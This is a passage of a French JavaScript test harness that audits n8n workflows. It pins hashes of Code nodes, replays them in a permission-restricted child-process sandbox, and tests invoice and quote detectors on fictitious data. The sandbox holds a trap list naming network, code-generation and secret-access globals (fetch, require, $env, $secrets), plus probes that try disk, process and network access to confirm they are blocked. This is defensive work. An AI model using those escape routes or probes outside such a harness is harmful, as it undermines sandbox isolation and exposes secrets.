  if (!clesExactes(o, CLES_OPTIONS_HTTP)) { ko(`${n.name} : options HTTP hors gabarit (${o && typeof o === 'object' ? Object.keys(o).join(', ') : typeof o}) : timeout et pagination seulement`); return }
  if (!Number.isInteger(o.timeout) || o.timeout < 1 || o.timeout > DELAI_MAX_MS) ko(`${n.name} : options.timeout entre 1 et ${DELAI_MAX_MS} ms attendu (${o.timeout})`)
  if (!clesExactes(o.pagination, ['pagination'])) { ko(`${n.name} : options.pagination hors gabarit`); return }
  const pg = o.pagination.pagination
  if (!clesExactes(pg, CLES_PAGINATION)) { ko(`${n.name} : pagination hors gabarit (${pg && typeof pg === 'object' ? Object.keys(pg).join(', ') : typeof pg})`); return }
  if (pg.paginationMode !== 'updateAParameterInEachRequest') ko(`${n.name} : pagination ${pg.paginationMode} interdite (updateAParameterInEachRequest seulement)`)
  const pp = pg.parameters?.parameters
  if (!clesExactes(pg.parameters, ['parameters']) || !Array.isArray(pp) || pp.length !== 1 || !clesExactes(pp[0], ['type', 'name', 'value'])
    || pp[0].type !== 'qs' || pp[0].name !== 'offset' || pp[0].value !== OFFSET_ATTENDU) ko(`${n.name} : pagination : un seul paramètre qs offset = ${OFFSET_ATTENDU} attendu`)
  if (pg.paginationCompleteWhen !== 'other' || pg.completeExpression !== FIN_ATTENDUE) ko(`${n.name} : pagination : fin de pagination exacte attendue (${FIN_ATTENDUE})`)
  if (pg.limitPagesFetched !== true) ko(`${n.name} : pagination : limitPagesFetched: true attendu`)
  if (!Number.isInteger(pg.maxRequests) || pg.maxRequests < 1 || pg.maxRequests > MAX_PAGES) ko(`${n.name} : pagination : maxRequests ≤ ${MAX_PAGES} attendu (${pg.maxRequests})`)
}

function chaineDepuis(wf, depart) {
  const ordre = []
  let courant = depart
  const vus = new Set()
  while (courant && !vus.has(courant)) {
    vus.add(courant); ordre.push(courant)
    const sorties = wf.connections?.[courant]?.main?.flat() ?? []
    if (sorties.length > 1) { ordre.push('(embranchement)'); break }
    courant = sorties[0]?.node
  }
  return ordre
}

/** É3 (a) : le code jugé est le texte audité, à l'octet près. */
function empreintes(wf) {
  const e = []
  const codes = wf.nodes.filter((n) => n.type === 'n8n-nodes-base.code')
  for (const n of codes) {
    const attendue = EMPREINTES.get(n.name)
    if (!attendue) e.push(`${n.name} : nœud Code sans empreinte épinglée — nouvel audit requis`)
    else if (sha256(n.parameters?.jsCode ?? '') !== attendue) e.push(`${n.name} : code différent de celui audité (sha256 ${sha256(n.parameters?.jsCode ?? '').slice(0, 12)}…, épinglé ${attendue.slice(0, 12)}…) — nouvel audit requis`)
  }
  for (const nom of EMPREINTES.keys()) if (!codes.some((n) => n.name === nom)) e.push(`${nom} : nœud Code épinglé absent de l'export — nouvel audit requis`)
  return e
}

// ─── É3 (b) : le bac à sable du rejeu ─────────────────────────────────────────────────────────────────────────────────────────
// Ce corps tourne dans le PROCESSUS ENFANT (sérialisé par `toString`, passé à `node -e` : l'enfant n'a besoin d'aucun fichier).
// L'enfant est lancé avec `--permission` sans aucune `--allow-*` : ni lecture ni écriture disque, ni processus, ni worker, ni module
// natif ; `--disallow-code-generation-from-strings` ; un environnement vide (aucun secret de l'hôte). Chaque exécution d'un nœud a un
// contexte vm neuf, créé par `vm.constants.DONT_CONTEXTIFY` : son objet global est celui d'un royaume vierge, aucun objet de l'hôte n'y
// entre (les données passent en TEXTE JSON et sont relues dedans), donc ni `this.constructor.constructor` ni `Function('return this')`
// ne mènent à l'hôte ; la génération de code y est coupée.
function enfant() {
  'use strict'
  const vm = require('node:vm')
  const fs = require('node:fs')
  const os = require('node:os')
  const chemin = require('node:path')
  const processus = require('node:child_process')
  const fils = require('node:worker_threads')
  const reseau = require('node:net')
  // Défense en profondeur : le royaume de l'enfant lui-même perd ses portes vers l'extérieur avant tout code du workflow.
  for (const k of ['fetch', 'WebSocket', 'EventSource', 'XMLHttpRequest', 'require', 'module']) { try { delete globalThis[k] } catch { /* rien */ } }
  for (const k of ['getBuiltinModule', 'binding', '_linkedBinding', 'dlopen']) { try { process[k] = undefined } catch { /* rien */ } }

  // Les noms que le code d'un nœud n'a pas à toucher : chacun est un piège qui note la tentative, même si le code la rattrape.
  const PIEGES = ['fetch', 'XMLHttpRequest', 'WebSocket', 'EventSource', 'require', 'module', 'exports', 'process', 'Buffer', 'global',
    'setTimeout', 'setInterval', 'setImmediate', 'helpers', '$http', '$execution', '$getWorkflowStaticData', 'getWorkflowStaticData',
    '$env', '$vars', '$secrets', 'Function', 'eval', 'WebAssembly', 'SharedArrayBuffer', 'Atomics']
  const PREAMBULE = `(() => {
    'use strict'
    const D = JSON.parse(globalThis.__donnees); delete globalThis.__donnees
    const Chaine = String, appliquer = Reflect.apply, definir = Object.defineProperty, stringify = JSON.stringify
    const vues = []
    const note = (q) => { vues[vues.length] = Chaine(q) }
    const refus = (q) => { note(q); throw new TypeError(q + ' interdit dans un nœud Code (bac à sable du juge)') }
    for (const nom of ${JSON.stringify(PIEGES)}) definir(globalThis, nom, { get() { return refus(nom) }, set() { refus(nom) }, configurable: false })
    const fauxConstructeur = function () { return refus('génération de code (constructeur de fonction)') }
    for (const proto of [Object.getPrototypeOf(function () {}), Object.getPrototypeOf(async function () {}), Object.getPrototypeOf(function* () {}), Object.getPrototypeOf(async function* () {})]) {
      definir(proto, 'constructor', { value: fauxConstructeur, writable: false, configurable: false })
    }
    const enItems = (l) => (l || []).map((j) => ({ json: j }))
    const $ = (nom) => {
      if (!Object.prototype.hasOwnProperty.call(D.sorties, nom)) throw new Error("lecture d'un nœud inconnu : " + nom)
      const items = enItems(D.sorties[nom]); return { all: () => items, first: () => items[0] }
    }
    const entree = enItems(D.entree)
    const $input = { all: () => entree, first: () => entree[0] }
    const $now = { setZone: (z) => { if (z !== 'Europe/Paris') throw new Error('fuseau inattendu'); return { toISODate: () => D.jour } } }
    // \`this\` du code : dans n8n il porte les helpers (httpRequest…) ; ici, tout accès est noté et refusé.
    const ceci = new Proxy({}, {
      get(_, k) { return refus('this.' + Chaine(k)) }, set(_, k) { return refus('this.' + Chaine(k)) }, has(_, k) { return refus('this.' + Chaine(k)) },
      ownKeys() { return refus('this (clés)') }, getOwnPropertyDescriptor(_, k) { return refus('this.' + Chaine(k)) },
      defineProperty(_, k) { return refus('this.' + Chaine(k)) }, deleteProperty(_, k) { return refus('this.' + Chaine(k)) },
      getPrototypeOf() { return refus('this (prototype)') }, setPrototypeOf() { return refus('this (prototype)') },
    })
    let appels = 0, resultat = null
    definir(globalThis, '__harnais', { value: (f) => {
      appels++
      if (appels > 1) { note('harnais rappelé'); return }
      try {
        const r = appliquer(f, ceci, [$, $input, $now])
        if (r && typeof r.then === 'function') throw new Error('code asynchrone : non rejoué')
        if (!Array.isArray(r)) throw new Error("le code doit rendre une liste d'éléments")
        resultat = { items: r.map((i) => i && i.json) }
      } catch (e) { resultat = { erreur: Chaine(e && e.message || e) } }
    }, writable: false, configurable: false })
    // Les tentatives se relisent hors de toute méthode que le code aurait pu remplacer (boucle indexée, concaténation de texte).
    definir(globalThis, '__resultat', { value: () => {
      let t = ''
      for (let i = 0; i < vues.length; i++) t += (i ? '\\u0001' : '') + vues[i]
      return t + '\\u0000' + appels + '\\u0000' + stringify(resultat || { erreur: 'harnais jamais appelé' })
    }, writable: false, configurable: false })
  })()`

  const texte = (e) => { try { return String(e && e.message || e).slice(0, 300) } catch { return 'erreur illisible' } }
  /** Un nœud Code, dans un contexte neuf. Rend { items, erreur, violations }. */
  function executer(jsCode, sortiesTexte, entree, jour) {
    const ctx = vm.createContext(vm.constants.DONT_CONTEXTIFY, { name: 'noeud-code', codeGeneration: { strings: false, wasm: false }, microtaskMode: 'afterEvaluate' })
    ctx.__donnees = '{"sorties":' + sortiesTexte + ',"entree":' + JSON.stringify(entree) + ',"jour":' + JSON.stringify(jour) + '}'
    vm.runInContext(PREAMBULE, ctx, { timeout: 2000 })
    let erreurScript = null
    try { vm.runInContext('__harnais(function ($, $input, $now) {\n' + jsCode + '\n});', ctx, { timeout: 5000, filename: 'noeud-code.js' }) } catch (e) { erreurScript = texte(e) }
    const brut = vm.runInContext('__resultat()', ctx, { timeout: 1000 })
    if (typeof brut !== 'string') throw new Error('résultat du bac à sable illisible')
    const [vuesTexte, appels, json] = brut.split('\u0000')
    const r = JSON.parse(json)
    const violations = vuesTexte ? vuesTexte.split('\u0001') : []
    if (appels !== '1') violations.push(`harnais appelé ${appels} fois`)
    return { items: r.items, erreur: erreurScript || r.erreur || null, violations }
  }
  function unNoeud(nom, jsCode, sortiesTexte, entree, jour) {
    const r = executer(jsCode, sortiesTexte, entree, jour)
    if (r.violations.length) throw new Error(`${nom} : accès refusé par le bac à sable (${[...new Set(r.violations)].join(', ')})`)
    if (r.erreur) throw new Error(`${nom} : ${r.erreur}`)
    if (!Array.isArray(r.items)) throw new Error(`${nom} : sortie illisible`)
    return r.items
  }
  function passer(m) {
    const sorties = {}
    for (const [nom, code] of m.prealables) sorties[nom] = unNoeud(nom, code, '{}', [{}], m.jour)
    for (const [nom, lignes] of Object.entries(m.lectures)) sorties[nom] = lignes
    const sortiesTexte = JSON.stringify(sorties)
    let entree = [{}]
    const parNoeud = {}
    for (const [nom, code] of m.etapes) { entree = unNoeud(nom, code, sortiesTexte, entree, m.jour); parNoeud[nom] = entree }
    return parNoeud
  }
  /** Ce que l'enfant lui-même peut faire : chaque geste doit être refusé par le modèle de permissions de Node. */
  function sonder(m) {
    const r = {}
    const essai = (k, f) => { try { f(); r[k] = 'PERMIS' } catch (e) { r[k] = (e && e.code) || texte(e) } }
    essai('ecriture', () => fs.writeFileSync(chemin.join(os.tmpdir(), 'detecteurs-n8n-qa-sonde.txt'), 'x'))
    essai('lecture', () => fs.readFileSync(m.fichier))
    essai('processus', () => processus.spawnSync(process.execPath, ['-v']))
    essai('worker', () => new fils.Worker('1', { eval: true }))
    r.permission = typeof process.permission === 'object' && process.permission !== null
    // Réseau : `process.permission.has('net')` n'est pas une preuve (Node 24 rend `false` et laisse pourtant partir la connexion).
    // On essaie pour de vrai, vers la boucle locale seulement (port 9, « discard »), et on referme aussitôt : Node 25 et suivants
    // refusent dès l'appel (ERR_ACCESS_DENIED, sans `--allow-net`) ; Node 24 n'a pas ce barrage.
    try { const s = reseau.connect({ port: 9, host: '127.0.0.1' }); s.on('error', () => {}); s.destroy(); r.reseau = 'PERMIS' } catch (e) { r.reseau = (e && e.code) || texte(e) }
    r.node = process.version
    return r
  }
  process.on('message', (m) => {
    let rep
    try {
      const valeur = m.type === 'passer' ? passer(m) : m.type === 'executer' ? executer(m.jsCode, '{}', Array.isArray(m.entree) ? m.entree : [{}], m.jour) : m.type === 'sonde' ? sonder(m) : null
      rep = { id: m.id, ok: true, valeur }
    } catch (e) { rep = { id: m.id, ok: false, erreur: texte(e) } }
    process.send(rep)
  })
}
const CODE_ENFANT = '(' + enfant.toString() + ')()'

class BacASable {
  constructor() {
    // `--permission` (stable depuis Node 23.5 et 22.13) ; `--experimental-permission` avant.
    const permission = process.allowedNodeEnvironmentFlags.has('--permission') ? '--permission' : '--experimental-permission'
    this.drapeaux = [permission, '--disallow-code-generation-from-strings']
    const env = {}
    if (process.env.SystemRoot) env.SystemRoot = process.env.SystemRoot // Windows : sans lui, Node ne démarre pas toujours
    this.p = spawn(process.execPath, [...this.drapeaux, '-e', CODE_ENFANT], { stdio: ['ignore', 'ignore', 'pipe', 'ipc'], env, serialization: 'json', windowsHide: true })
    this.attente = new Map()
    this.n = 0
    this.erreurs = ''
    this.p.stderr.on('data', (d) => { this.erreurs = (this.erreurs + d).slice(-2000) })
    this.p.on('message', (m) => { const a = this.attente.get(m.id); if (!a) return; this.attente.delete(m.id); if (m.ok) a.ok(m.valeur); else a.ko(new Error(m.erreur)) })
    this.p.on('exit', (code) => {
      this.arrete = true
      for (const a of this.attente.values()) a.ko(new Error(`bac à sable arrêté (code ${code}) ${this.erreurs.slice(0, 300)}`))
      this.attente.clear()
    })
  }
  demander(m) {
    if (this.arrete) return Promise.reject(new Error(`bac à sable arrêté ${this.erreurs.slice(0, 300)}`))
    return new Promise((ok, ko) => { const id = ++this.n; this.attente.set(id, { ok, ko }); this.p.send({ ...m, id }) })
  }
  fermer() { this.p.kill() }
}
const BAC = new BacASable()

// ─── 2. Copies figées comparées au code ────────────────────────────────────────────────────────────────────────────────────────
const executer = async (wf, nom, jour, entree) => {
  const r = await BAC.demander({ type: 'executer', jsCode: codeDe(wf, nom), jour, entree })
  if (r.violations.length) throw new Error(`accès refusé par le bac à sable (${[...new Set(r.violations)].join(', ')})`)
  if (r.erreur) throw new Error(r.erreur)
  return r.items
}
async function copies(wf) {
  const e = []
  let cap, ctx
  try { cap = (await executer(wf, 'Capacités des offres', '2026-11-10'))[0] } catch (err) { return [`Capacités des offres : ${err.message}`] }
  try { ctx = (await executer(wf, 'Contexte du passage', '2026-11-10'))[0] } catch (err) { return [`Contexte du passage : ${err.message}`] }
  for (const offre of ['studio', 'signature', 'entreprise']) {
    if (!memes(cap.capacites?.[offre] ?? [], PLANS[offre].capacites)) e.push(`copie des capacités « ${offre} » différente de lib/plans.ts`)
  }
  if (Object.keys(cap.capacites ?? {}).some((k) => !['studio', 'signature', 'entreprise'].includes(k))) e.push('la copie ne doit porter que Studio, Signature et Entreprise')
  if (!memes(cap.outils_jamais_auto ?? [], OUTILS_JAMAIS_AUTO)) e.push('copie de OUTILS_JAMAIS_AUTO différente de lib/pilote/regles.ts')
  if (!memes(cap.outils_executables_pilote ?? [], OUTILS_EXECUTABLES_PILOTE)) e.push('copie de OUTILS_EXECUTABLES_PILOTE différente de lib/pilote/regles.ts')
  if (JSON.stringify(Object.entries(cap.outil_type ?? {}).sort()) !== JSON.stringify(Object.entries(OUTIL_TYPE).sort())) e.push('copie de OUTIL_TYPE différente de lib/pilote/regles.ts')
  const s = ctx.seuils ?? {}
  if (s.impayes_ecart_min !== ECART_MIN) e.push('écart minimal entre deux relances d\'impayé différent de lib/relancesImpayes.ts (ECART_MIN, M6)')
  if (s.demande_borne_jours !== CADENCE_RELANCES.at(-1)) e.push('borne haute du n° 6 différente de la dernière relance de conversation (CADENCE_RELANCES, lib/relances.ts, M8)')
  if ((s.demande_jours ?? []).join(',') !== '1,3' || s.devis_expire_avant_jours !== 7) e.push('seuils du lot (n° 6 : 1 et 3 jours ; n° 8 : 7 jours) changés sans le brief')
  const attenduesSeuils = ['impayes_jours', 'impayes_rattrapage', 'impayes_ecart_min', 'devis_jours', 'devis_validite_defaut', 'devis_expire_avant_jours', 'demande_jours', 'demande_borne_jours', 'avis_delai', 'avis_rattrapage']
  if (!clesExactes(s, attenduesSeuils)) e.push(`seuils hors liste (${Object.keys(s).join(', ')})`)
  if (ctx.mode !== 'simulation') e.push('mode simulation attendu')
  if ((s.impayes_jours ?? []).join(',') !== JOURS_PAR_DEFAUT.join(',')) e.push('étapes des impayés différentes de lib/relancesImpayes.ts')
  if (s.impayes_rattrapage !== RATTRAPAGE_IMPAYES) e.push('rattrapage des impayés différent de lib/relancesImpayes.ts')
  if (s.avis_delai !== DELAI_AVIS_JOURS || s.avis_rattrapage !== RATTRAPAGE_AVIS) e.push('délai de la demande d\'avis différent de lib/apresChantier.ts')
  if (s.devis_validite_defaut !== VALIDITE_PAR_DEFAUT_JOURS) e.push('validité par défaut d\'un devis différente du code')
  if ((s.devis_jours ?? []).join(',') !== '3,7,14') e.push('étapes du devis sans réponse : 3, 7, 14 attendues (plan §9, n° 4)')
  // Aucune décision par le nom de l'offre dans la logique : le niveau se lit dans la copie.
  for (const nom of [...DETECTEURS, 'Niveau proposé selon l offre']) {
    if (/plan\s*[!=]==?\s*['"]|['"](studio|signature|entreprise)['"]\s*[!=]==?/.test(codeDe(wf, nom))) e.push(`${nom} : décision par le nom de l'offre (plan === …) interdite`)
  }
  return e
}

// ─── 3. Rejeu des nœuds Code sur des données fictives, dans le bac à sable ────────────────────────────────────────────────────
const LECTURES = (wf) => wf.nodes.filter((n) => n.type === 'n8n-nodes-base.httpRequest').map((n) => n.name)

/** Un passage complet, de « Départ des constats » au bilan, sur des lectures fictives, rejoué dans le processus enfant. */
async function passer(wf, donnees, jour) {
  const lectures = LECTURES(wf)
  for (const k of Object.keys(donnees)) if (!lectures.includes(k)) throw new Error(`donnée fictive pour un nœud absent : ${k}`)
  // Une table vide rend un élément vide, comme alwaysOutputData dans n8n.
  const sorties = {}
  for (const l of lectures) sorties[l] = donnees[l]?.length ? donnees[l] : [{}]
  const parNoeud = await BAC.demander({
    type: 'passer', jour, lectures: sorties,
    prealables: ['Contexte du passage', 'Capacités des offres'].map((nom) => [nom, codeDe(wf, nom)]),
    etapes: chaineDepuis(wf, 'Départ des constats').map((nom) => [nom, codeDe(wf, nom)]),
  })
  return { constats: parNoeud['Niveau proposé selon l offre']?.[0]?.constats ?? [], bilan: parNoeud['Bilan par détecteur'] ?? [], parNoeud }
}

// Données fictives : identifiants inventés, aucun nom, aucune adresse.
const u = (n) => '00000000-0000-4000-8000-' + String(n).padStart(12, '0')
const STUDIO = u(1), SIGNATURE = u(2), ENTREPRISE = u(3), HORS = u(9)
const JOUR = '2026-11-10'
const jourMoins = (n, depuis = JOUR) => { const d = new Date(depuis + 'T12:00:00Z'); d.setUTCDate(d.getUTCDate() - n); return d.toISOString().slice(0, 10) }
const horodate = (n, depuis = JOUR) => jourMoins(n, depuis) + 'T10:00:00+00:00'
const COMPTES = [{ id: STUDIO, plan: 'studio' }, { id: SIGNATURE, plan: 'signature' }, { id: ENTREPRISE, plan: 'entreprise' }]
const avec = (lignes) => ({ 'Lire comptes': COMPTES, ...lignes })
const facture = (o) => ({ id: u(100), artisan_id: STUDIO, devis_id: null, statut: 'emise', date_echeance: jourMoins(3), total_ttc: 1000, avoir_de: null, payee_le: null, type_facture: 'standard', ...o })
const devis = (o) => ({ id: u(200), artisan_id: STUDIO, statut: 'envoye', date_emission: jourMoins(3), validite_jours: 90, acompte_pct: 0, total_ttc: 800, lead_id: null, accepte_le: null, envoye_le: horodate(3), created_at: horodate(3), ...o })
const demande = (o) => ({ id: u(300), artisan_id: STUDIO, statut: 'nouveau', urgence: null, type_chantier: null, prise_en_main: false, created_at: horodate(1), updated_at: horodate(1), ...o })
const chantier = (o) => ({ id: u(400), artisan_id: SIGNATURE, devis_id: null, statut: 'termine', date_fin_reelle: jourMoins(2), maj_le: horodate(2), ...o })
// Le pilote activé pour tous les types (lib/pilote/regles.ts:36) : sans lui, aucun niveau 3 (M3).
const TOUS_TYPES = { reponse_prospect: true, relance_devis: true, relance_impaye: true, envoi_devis: true, envoi_facture: true, assistant_client: true }
const pilote = (artisan_id, types = TOUS_TYPES, actif = true) => ({ artisan_id, actif, types })
const PILOTE_SIGNATURE = { 'Lire reglages du pilote': [pilote(SIGNATURE)] }
const arret = (o) => ({ facture_id: u(100), artisan_id: STUDIO, raison: 'reponse_client', le: horodate(1), reprise_le: null, ...o })
const rappel = (o) => ({ id: u(950), artisan_id: SIGNATURE, chantier_id: u(400), type: 'entretien', echeance: jourMoins(1), fait_le: null, envoye_le: null, origine: 'systeme', cle: `entretien:${u(400)}:1`, ...o })
const ENTRETIEN = { 'Lire apres chantier': [{ artisan_id: SIGNATURE, avis: false, entretien: true, actif_depuis: null }] }

async function cas(wf) {
  const e = []
  const ko = (m) => e.push(m)
  let rang = 0
  // Chaque cas passe aussi par `controler` : les plafonds tiennent sur chaque constat de chaque cas.
  const run = async (donnees, jour = JOUR) => { const d = avec(donnees); const r = await passer(wf, d, jour); controler(`cas ${++rang}`, d, r.constats, ko); return r }
  const de = (r, n) => r.constats.filter((c) => c.numero === n)
  const cles = (r, n) => de(r, n).map((c) => c.cle).sort().join(' ')
  const seul = (titre, r, n, cle, extra = {}) => {
    const l = de(r, n)
    if (l.length !== 1 || l[0].cle !== cle) { ko(`${titre} : attendu ${cle}, obtenu [${cles(r, n)}]`); return null }
    for (const [k, v] of Object.entries(extra)) if (l[0][k] !== v) ko(`${titre} : ${k} attendu ${v}, obtenu ${l[0][k]}`)
    return l[0]
  }
  const rien = (titre, r, n) => { if (de(r, n).length) ko(`${titre} : rien attendu, obtenu [${cles(r, n)}]`) }
  let r
  try {
    // n° 1 — facture échue
    r = await run({ 'Lire factures': [facture()] }); seul('1 J+3 pile', r, 1, `facture_echue:${u(100)}:j3`, { montant_centimes: 100000, jours: 3, niveau: 2 })
    r = await run({ 'Lire factures': [facture({ date_echeance: jourMoins(2) })] }); rien('1 J+2', r, 1)
    r = await run({ 'Lire factures': [facture({ date_echeance: jourMoins(10) })], 'Lire relances impayes': [{ id: u(801), artisan_id: STUDIO, facture_id: u(100), rang: 1, jour: jourMoins(7), statut: 'envoyee' }] })
    seul('1 étape suivante', r, 1, `facture_echue:${u(100)}:j10`)
    r = await run({ 'Lire factures': [facture({ payee_le: JOUR })] }); rien('1 payée', r, 1)
    r = await run({ 'Lire factures': [facture({ statut: 'payee' })] }); rien('1 statut payée', r, 1)
    r = await run({ 'Lire factures': [facture({ avoir_de: u(150) })] }); rien('1 avoir', r, 1)
    r = await run({ 'Lire factures': [facture()], 'Lire arrets de relance': [arret()] }); rien('1 arrêtée', r, 1)
    r = await run({ 'Lire factures': [facture()], 'Lire arrets de relance': [arret({ raison: 'artisan', reprise_le: horodate(1) })] }); seul('1 reprise', r, 1, `facture_echue:${u(100)}:j3`)
    r = await run({ 'Lire factures': [facture()], 'Lire relances impayes': [{ id: u(802), artisan_id: STUDIO, facture_id: u(100), rang: 1, jour: jourMoins(1), statut: 'a_valider' }] }); rien('1 à valider en attente', r, 1)
    r = await run({ 'Lire factures': [facture({ date_echeance: jourMoins(40) })] }); rien('1 trop ancienne', r, 1)
    r = await run({ 'Lire factures': [facture({ artisan_id: HORS })] }); rien('1 compte hors offre', r, 1)
    r = await run({ ...PILOTE_SIGNATURE, 'Lire factures': [facture({ artisan_id: SIGNATURE })], 'Lire reglages des relances': [{ artisan_id: SIGNATURE, actif: true, jours: [3, 10, 21] }] }); seul('1 Signature cochée, pilote activé', r, 1, `facture_echue:${u(100)}:j3`, { niveau: 3, reserve: 'pilote' })
    r = await run({ 'Lire factures': [facture({ artisan_id: SIGNATURE })] }); seul('1 Signature non cochée', r, 1, `facture_echue:${u(100)}:j3`, { niveau: 2, reserve: null })
    r = await run({ 'Lire factures': [facture()], 'Lire reglages des relances': [{ artisan_id: STUDIO, actif: true, jours: [3, 10, 21] }] }); seul('1 Studio cochée', r, 1, `facture_echue:${u(100)}:j3`, { niveau: 2 })
    // M6 : l'écart minimal de 2 jours (ECART_MIN) après la relance précédente.
    const j10 = (jour) => ({ 'Lire factures': [facture({ date_echeance: jourMoins(10) })], 'Lire relances impayes': [{ id: u(801), artisan_id: STUDIO, facture_id: u(100), rang: 1, jour, statut: 'envoyee' }] })
    r = await run(j10(jourMoins(1))); rien('1 M6 relance partie hier (trop tôt)', r, 1)
    r = await run(j10(jourMoins(2))); seul('1 M6 relance partie il y a 2 jours', r, 1, `facture_echue:${u(100)}:j10`)
    // M2 : le journal et les arrêts d'un AUTRE compte ne touchent pas cette facture.
    r = await run({ 'Lire factures': [facture({ date_echeance: jourMoins(10) })], 'Lire relances impayes': [{ id: u(803), artisan_id: SIGNATURE, facture_id: u(100), rang: 1, jour: jourMoins(5), statut: 'envoyee' }] }); seul('1 M2 journal d’un autre compte', r, 1, `facture_echue:${u(100)}:j3`)
    r = await run({ 'Lire factures': [facture()], 'Lire arrets de relance': [arret({ artisan_id: SIGNATURE })] }); seul('1 M2 arrêt d’un autre compte', r, 1, `facture_echue:${u(100)}:j3`)

    // n° 2 — chantier à facturer
    r = await run({ 'Lire devis': [devis({ statut: 'accepte', total_ttc: 2000, accepte_le: horodate(5) })] }); seul('2 Studio devis accepté', r, 2, `chantier_a_facturer:${u(200)}:accepte`, { montant_centimes: 200000, niveau: 2 })
    r = await run({ 'Lire devis': [devis({ statut: 'accepte', total_ttc: 2000 })], 'Lire factures': [facture({ devis_id: u(200), type_facture: 'standard', statut: 'emise' })] }); rien('2 Studio facturé', r, 2)
    r = await run({ 'Lire devis': [devis({ statut: 'accepte', total_ttc: 2000 })], 'Lire factures': [facture({ devis_id: u(200), type_facture: 'acompte', total_ttc: 600 })] }); seul('2 reste après acompte', r, 2, `chantier_a_facturer:${u(200)}:accepte`, { montant_centimes: 140000 })
    r = await run({ 'Lire devis': [devis({ statut: 'accepte', total_ttc: 2000 })], 'Lire factures': [facture({ devis_id: u(200), type_facture: 'solde', statut: 'annulee' })] }); seul('2 solde annulé', r, 2, `chantier_a_facturer:${u(200)}:accepte`)
    r = await run({ 'Lire devis': [devis({ artisan_id: SIGNATURE, statut: 'accepte', total_ttc: 3000 })], 'Lire chantiers': [chantier({ devis_id: u(200) })] }); seul('2 Signature chantier fini', r, 2, `chantier_a_facturer:${u(400)}:termine`, { montant_centimes: 300000, niveau: 2 })
    r = await run({ 'Lire devis': [devis({ artisan_id: SIGNATURE, statut: 'accepte', total_ttc: 3000 })], 'Lire chantiers': [chantier({ devis_id: u(200), statut: 'en_cours' })] }); rien('2 Signature chantier en cours', r, 2)
    // M2 : une facture d'un autre compte posée sur le devis ne change pas le reste à facturer (032-010, annexe B : 200 000 → 150 000).
    r = await run({ 'Lire devis': [devis({ statut: 'accepte', total_ttc: 2000 })], 'Lire factures': [facture({ artisan_id: SIGNATURE, devis_id: u(200), type_facture: 'acompte', total_ttc: 500 })] }); seul('2 M2 facture d’un autre compte sur le devis', r, 2, `chantier_a_facturer:${u(200)}:accepte`, { montant_centimes: 200000 })
    r = await run({ 'Lire devis': [devis({ statut: 'accepte', total_ttc: 2000 })], 'Lire factures': [facture({ artisan_id: SIGNATURE, devis_id: u(200), type_facture: 'solde' })] }); seul('2 M2 solde d’un autre compte', r, 2, `chantier_a_facturer:${u(200)}:accepte`)
    r = await run({ 'Lire devis': [devis({ artisan_id: ENTREPRISE, statut: 'accepte', total_ttc: 3000 })], 'Lire chantiers': [chantier({ devis_id: u(200) })] }); rien('2 M2 chantier sur le devis d’un autre compte', r, 2)
    // M7 : sans date de fin réelle, aucun repli sur maj_le (les jours restent vides).
    r = await run({ 'Lire devis': [devis({ artisan_id: SIGNATURE, statut: 'accepte', total_ttc: 3000 })], 'Lire chantiers': [chantier({ devis_id: u(200), date_fin_reelle: null, maj_le: horodate(9) })] }); seul('2 M7 sans date de fin réelle', r, 2, `chantier_a_facturer:${u(400)}:termine`, { jours: null })

    // n° 3 — devis signé sans acompte
    r = await run({ 'Lire devis': [devis({ statut: 'accepte', acompte_pct: 30, total_ttc: 2000, accepte_le: horodate(1) })] }); seul('3 acompte manquant', r, 3, `devis_signe_sans_acompte:${u(200)}:signe`, { montant_centimes: 60000, niveau: 2 })
    r = await run({ 'Lire devis': [devis({ statut: 'accepte', acompte_pct: 30 })], 'Lire factures': [facture({ devis_id: u(200), type_facture: 'acompte' })] }); rien('3 acompte facturé', r, 3)
    r = await run({ 'Lire devis': [devis({ statut: 'accepte', acompte_pct: 30 })], 'Lire factures': [facture({ devis_id: u(200), type_facture: 'acompte', statut: 'annulee' })] }); seul('3 acompte annulé', r, 3, `devis_signe_sans_acompte:${u(200)}:signe`)
    r = await run({ 'Lire devis': [devis({ statut: 'accepte', acompte_pct: 0 })] }); rien('3 sans acompte prévu', r, 3)
    r = await run({ ...PILOTE_SIGNATURE, 'Lire devis': [devis({ artisan_id: SIGNATURE, statut: 'accepte', acompte_pct: 30 })], 'Lire reglages des relances': [{ artisan_id: SIGNATURE, actif: true }] }); seul('3 Signature : une facture ne s’émet jamais seule', r, 3, `devis_signe_sans_acompte:${u(200)}:signe`, { niveau: 2 })
    r = await run({ 'Lire devis': [devis({ statut: 'accepte', acompte_pct: 30 })], 'Lire factures': [facture({ artisan_id: SIGNATURE, devis_id: u(200), type_facture: 'acompte' })] }); seul('3 M2 acompte d’un autre compte', r, 3, `devis_signe_sans_acompte:${u(200)}:signe`)

    // n° 4 — devis sans réponse
    r = await run({ 'Lire devis': [devis()] }); seul('4 J+3 pile', r, 4, `devis_sans_reponse:${u(200)}:j3`, { montant_centimes: 80000, jours: 3, niveau: 2 })
    r = await run({ 'Lire devis': [devis({ envoye_le: horodate(2) })] }); rien('4 J+2', r, 4)
    r = await run({ 'Lire devis': [devis({ envoye_le: horodate(7) })] }); seul('4 étape J+7', r, 4, `devis_sans_reponse:${u(200)}:j7`)
    r = await run({ 'Lire devis': [devis({ envoye_le: horodate(20) })] }); seul('4 étape J+14', r, 4, `devis_sans_reponse:${u(200)}:j14`)
    r = await run({ 'Lire devis': [devis({ statut: 'accepte' })] }); rien('4 accepté', r, 4)
    r = await run({ 'Lire devis': [devis({ envoye_le: horodate(31), validite_jours: 30 })] }); rien('4 validité dépassée', r, 4)
    // M3 : en Signature, le niveau 3 n'existe qu'avec le pilote activé ET le type « relance_devis » activé, sans pause des demandes.
    r = await run({ 'Lire devis': [devis({ artisan_id: SIGNATURE })] }); seul('4 M3 Signature, pilote jamais activé', r, 4, `devis_sans_reponse:${u(200)}:j3`, { niveau: 2 })
    r = await run({ ...PILOTE_SIGNATURE, 'Lire devis': [devis({ artisan_id: SIGNATURE })] }); seul('4 M3 Signature, pilote activé', r, 4, `devis_sans_reponse:${u(200)}:j3`, { niveau: 3, reserve: 'pilote' })
    r = await run({ 'Lire reglages du pilote': [pilote(SIGNATURE, { relance_impaye: true })], 'Lire devis': [devis({ artisan_id: SIGNATURE })] }); seul('4 M3 type relance_devis coupé', r, 4, `devis_sans_reponse:${u(200)}:j3`, { niveau: 2 })
